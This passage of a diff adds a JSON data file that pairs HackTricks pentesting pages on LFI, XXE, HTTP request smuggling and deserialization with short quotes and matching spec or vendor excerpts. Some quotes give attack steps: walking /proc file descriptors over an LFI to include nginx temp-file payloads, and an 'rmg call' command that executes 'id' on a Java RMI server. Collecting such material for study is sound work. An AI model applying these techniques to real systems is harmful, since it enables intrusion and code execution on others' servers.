+    "page": "pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files.md",
+    "title": "LFI2RCE via Nginx temp files",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files.md",
+    "quotes": [
+     {
+      "quote": "Fetch /proc/<pid>/cmdline over the LFI until you find strings like nginx: worker process.",
+      "class_terms": [
+       "lfi"
+      ]
+     },
+     {
+      "quote": "Feed the discovered /proc/<pid>/fd/<fd> paths back into your LFI parameter to include the buffered payload.",
+      "class_terms": [
+       "lfi"
+      ]
+     },
+     {
+      "quote": "Use multiple processes to flood workers so that at least one temp file stays around long enough for your LFI brute force to catch it.\n* In Kubernetes or other orchestrators, privilege boundaries may look different, but the primitive is the same: find a way to drop bytes into nginx buffers, then walk /proc from anywhere you can issue file system reads.",
+      "class_terms": [
+       "lfi"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://httpwg.org/specs/rfc9110.html",
+     "quote": "Characters other than those in the \"reserved\" set are equivalent to their percent-encoded octets: the normal form is to not encode them",
+     "org": "httpwg.org"
+    }
+   }
+  ],
+  "xxe": [
+   {
+    "page": "pentesting-web/xxe-xee-xml-external-entity.md",
+    "title": "XXE - XEE - XML External Entity",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xxe-xee-xml-external-entity.md",
+    "quotes": [
+     {
+      "quote": "External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: <!DOCTYPE foo [ <!ENTITY myentity \"value\" > ]>\n- XXE Detection with Parameter Entities:",
+      "class_terms": [
+       "external entity",
+       "xml external entity",
+       "xml parser"
+      ]
+     },
+     {
+      "quote": "SVG, being an XML-based format, can be exploited by attackers to submit malicious SVG images, thereby exposing the server to XXE (XML External Entity) vulnerabilities.",
+      "class_terms": [
+       "external entity",
+       "xml external entity"
+      ]
+     },
+     {
+      "quote": "This indicates a successful XXE (XML External Entity) attack, leveraging both Out of Band and Error-Based techniques to extract sensitive information.",
+      "class_terms": [
+       "external entity",
+       "xml external entity"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://lxml.de/parsing.html",
+     "quote": "huge_tree - disable security restrictions and support very deep trees and very long text content (only affects libxml2 2.7+)",
+     "org": "lxml.de"
+    }
+   }
+  ],
+  "smuggling": [
+   {
+    "page": "pentesting-web/http-connection-request-smuggling.md",
+    "title": "HTTP Connection Request Smuggling",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/http-connection-request-smuggling.md",
+    "quotes": [
+     {
+      "quote": "HTTP Connection Request Smuggling\n\n{{#include ../banners/hacktricks-training.md}}\n\nHTTP connection request smuggling is a connection-state / routing problem rather than a classic CL.TE/TE.CL parser discrepancy.",
+      "class_terms": [
+       "request smuggling"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://cwe.mitre.org/data/definitions/444.html",
+     "quote": "This weakness is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.",
+     "org": "mitre.org"
+    }
+   },
+   {
+    "page": "pentesting-web/http-request-smuggling/README.md",
+    "title": "HTTP Request Smuggling / HTTP Desync Attack",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/http-request-smuggling/README.md",
+    "quotes": [
+     {
+      "quote": "HTTP request smuggling attacks are crafted by sending ambiguous requests that exploit discrepancies in how front-end and back-end servers interpret the Content-Length (CL) and Transfer-Encoding (TE) headers.",
+      "class_terms": [
+       "content-length",
+       "request smuggling",
+       "transfer-encoding"
+      ]
+     },
+     {
+      "quote": "Transfer-Encoding: gzip was enough to trigger CL.0-style desyncs because one hop still honored Content-Length while another treated the HTTP/1.0 message as faulty framed.<sup>[[22]](#references)</sup>\n- Response-only semantics inside requests:",
+      "class_terms": [
+       "content-length",
+       "desync",
+       "transfer-encoding"
+      ]
+     },
+     {
+      "quote": "CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)\n\n- Front-End (CL):",
+      "class_terms": [
+       "content-length",
+       "transfer-encoding"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://tomcat.apache.org/tomcat-9.0-doc/config/http.html",
+     "quote": "If an HTTP request is received that contains an illegal header name or value (e.g. the header name is not a token) this setting determines if the request will be rejected with a 400 response ( true ) or if the illegal header be ignored ( false ). The default value is true which will cause the request to be rejected.",
+     "org": "apache.org"
+    }
+   },
+   {
+    "page": "pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades.md",
+    "title": "Request Smuggling in HTTP/2 Downgrades",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades.md",
+    "quotes": [
+     {
+      "quote": "RFC 9113 is stricter than many downgrade implementations:\n * connection-specific headers such as transfer-encoding, upgrade, keep-alive, or proxy-connection make the HTTP/2 message malformed;\n * te is only valid as te: trailers;\n * if content-length is present, it must match the sum of the DATA frame payload lengths.",
+      "class_terms": [
+       "content-length",
+       "transfer-encoding"
+      ]
+     },
+     {
+      "quote": "Strip and regenerate body-length metadata on downgrade \u2013 never forward attacker-supplied Content-Length / Transfer-Encoding into the downgraded request.",
+      "class_terms": [
+       "content-length",
+       "transfer-encoding"
+      ]
+     },
+     {
+      "quote": "Request Smuggling in HTTP/2 Downgrades\n\n{{#include ../../banners/hacktricks-training.md}}\n\nHTTP/2 is generally considered immune to classic request-smuggling because the length of each DATA frame is explicit.",
+      "class_terms": [
+       "request smuggling"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://www.helpnetsecurity.com/2024/02/29/bobthesmuggler-open-source-tool-undetectable-payload-delivery/",
+     "quote": "hiding the payload inside image polyglots, calling the PNG/GIF files from remote (hence keeping the size minimal), and then evading DLPs & firewalls by adding dynamic XOR encryption to the payloads hidden inside the image",
+     "org": "helpnetsecurity.com"
+    }
+   },
+   {
+    "page": "pentesting-web/http-response-smuggling-desync.md",
+    "title": "HTTP Response Smuggling / Desync",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/http-response-smuggling-desync.md",
+    "quotes": [
+     {
+      "quote": "Legitimate reuse-required cases still exist: connection-locked request smuggling, connection-state attacks, and client-side desync.",
+      "class_terms": [
+       "desync",
+       "request smuggling"
+      ]
+     },
+     {
+      "quote": "Response Desynchronisation\n\nUp to this point, we have learned how to abuse HTTP Request Smuggling attacks to control the request whose response a client is going to receive and how you can then steal the response that was meant for the victim.",
+      "class_terms": [
+       "desynchronisation",
+       "request smuggling"
+      ]
+     },
+     {
+      "quote": "When auditing modern stacks, also test response translation layers and not just classic CL.TE / TE.CL ambiguities in requests:<sup>[[2]](#references)</sup>\n\n- Response TE.CL / dechunk-vs-length mismatches: one hop dechunks a backend response or strips Transfer-Encoding, while another hop still trusts Content-Length.",
+      "class_terms": [
+       "content-length",
+       "transfer-encoding"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://cwe.mitre.org/data/definitions/444.html",
+     "quote": "For example, discrepancies can arise in how to handle duplicate headers like two Transfer-encoding (TE) or two Content-length (CL), or the malicious HTTP message will have different headers for TE and CL.",
+     "org": "mitre.org"
+    }
+   }
+  ],
+  "deser": [
+   {
+    "page": "generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md",
+    "title": "Keras Model Deserialization Rce And Gadget Hunting",
+    "section": "generic-methodologies-and-resources",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md",
+    "quotes": [
+     {
+      "quote": "Pickle opcodes can invoke attacker-controlled behavior during deserialization, including model tampering or RCE, and simple scanners can miss novel or unlisted dangerous imports.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>\n\nA practical fail-closed defense is to hook Python\u2019s pickle deserializer and only allow a reviewed set of harmless ML-related imports during unpickling.",
+      "class_terms": [
+       "deserialization",
+       "pickle"
+      ]
+     },
+     {
+      "quote": "For example, keras.utils.get_file downloads a URL and writes it under the configured cache location, making it a candidate for gadget analysis.<sup>[[1]](#references)[[19]](#references)</sup>\n\nCandidate Lambda configuration (validate the call signature in a controlled test):\n\njson\n{\n \"module\":",
+      "class_terms": [
+       "gadget"
+      ]
+     },
+     {
+      "quote": "The legacy Keras Lambda path above uses marshaled function bytecode instead, so it is a separate deserialization risk.",
+      "class_terms": [
+       "deserialization"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://www.nccgroup.com/research/freddy-an-extension-for-automatically-identifying-deserialisation-issues-in-java-and-net-applications/",
+     "quote": "The first payload set is useful to reveal serialisation technologies through errors and exceptions while the second set can be used to expose RCE vulnerabilities.",
+     "org": "nccgroup.com"
+    }
+   },
+   {
+    "page": "network-services-pentesting/1099-pentesting-java-rmi.md",
+    "title": "1098/1099/1050 - Pentesting Java RMI - RMI-IIOP",
+    "section": "network-services-pentesting",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/1099-pentesting-java-rmi.md",
+    "quotes": [
+     {
+      "quote": "The command executes the remote application's own execute method; rmg does not make every discovered method a command-execution primitive:\n\n\n$ rmg call 172.17.0.2 9010 '\"id\"' --bound-name plain-server --signature \"String execute(String dummy)\" --plugin GenericPrint.jar\n[+] uid=0(root) gid=0(root) groups=0(root)\n\n\nIf a non-primitive parameter is deserialized without an effective filter and a compatible gadget chain exists on the server classpath, test deserialization with a harmless canary before any command payload.",
+      "class_terms": [
+       "deserialization",
+       "gadget"
+      ]
+     },
+     {
+      "quote": "Current Default\n[+]\n[+] RMI server JEP290 enumeration:\n[+]\n[+] - DGC rejected deserialization of java.util.HashMap (JEP290 is installed).\n[+] Vulnerability Status:",
+      "class_terms": [
+       "deserialization"
+      ]
+     },
+     {
+      "quote": "Non Vulnerable\n[+]\n[+] RMI registry JEP290 bypass enmeration:\n[+]\n[+] - Caught IllegalArgumentException after sending An Trinh gadget.\n[+] Vulnerability Status:",
+      "class_terms": [
+       "gadget"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://httpwg.org/specs/rfc9530.html",
+     "quote": "Integrity fields are not intended to be a general protection against malicious tampering with HTTP messages. In the absence of additional security mechanisms",
+     "org": "httpwg.org"
+    }
+   },
+   {
+    "page": "network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md",
+    "title": "Php Rce Abusing Object Creation New Usd Get A Usd Get B",
+    "section": "network-services-pentesting",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md",
+    "quotes": [
+     {
+      "quote": "SSRF + Phar Deserialization\n\nThe SplFileObject constructor can provide an SSRF primitive when the requested stream wrapper is enabled;",
+      "class_terms": [
+       "deserialization"
+      ]
+     },
+     {
+      "quote": "Reuse that exact session ID when triggering the PhpManager gadget, or the wrong file will be loaded.",
+      "class_terms": [
+       "gadget"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://bishopfox.com/blog/gwt-unpatched-unauthenticated-java-deserialization-vulnerability",
+     "quote": "If you see Base64-encoded Java classes in any traffic to a GWT-based application, the application is almost certainly vulnerable.",
+     "org": "bishopfox.com"
+    }
+   },
+   {
+    "page": "pentesting-web/deserialization/README.md",
+    "title": "Deserialization",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/deserialization/README.md",
+    "quotes": [
+     {
+      "quote": "TypeNameHandling = TypeNameHandling.None\n- Avoid using JavaScriptSerializer with a JavaScriptTypeResolver.\n- Limit the types that can be deserialized, understanding the inherent risks with .Net types, such as System.IO.FileInfo, which can modify server files' properties, potentially leading to denial of service attacks.\n- Be cautious with types having risky properties, like System.ComponentModel.DataAnnotations.ValidationException with its Value property, which can be exploited.\n- Securely control type instantiation to prevent attackers from influencing the deserialization process, rendering even DataContractSerializer or XmlSerializer vulnerable.\n- Implement white list controls using a custom SerializationBinder for BinaryFormatter and JSON.Net.\n- Stay informed about known insecure deserialization gadgets within .Net and ensure deserializers do not instantiate such types.\n- Isolate potentially risky code from code with internet access to avoid exposing known gadgets, such as System.Windows.Data.ObjectDataProvider in WPF applications, to untrusted data sources.",
+      "class_terms": [
+       "deserialization",
+       "gadget"
+      ]
+     },
+     {
+      "quote": "Deserialization can be dangerous because it potentially allows attackers to manipulate the serialized data to execute harmful code or cause unexpected behavior in the application during the object reconstruction process.",
+      "class_terms": [
+       "deserialization"
+      ]
+     },
+     {
+      "quote": "PHP\n\nIn PHP, specific magic methods are utilized during the serialization and deserialization processes:\n\n- sleep:",
+      "class_terms": [
+       "deserialization"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://docs.python.org/3/library/pickle.html",
+     "quote": "It is possible to construct malicious pickle data which will execute arbitrary code during unpickling . Never unpickle data that could have come from an untrusted source, or that could have been tampered with.",
+     "org": "python.org"
+    }
+   }
+  ]
+ }
+}
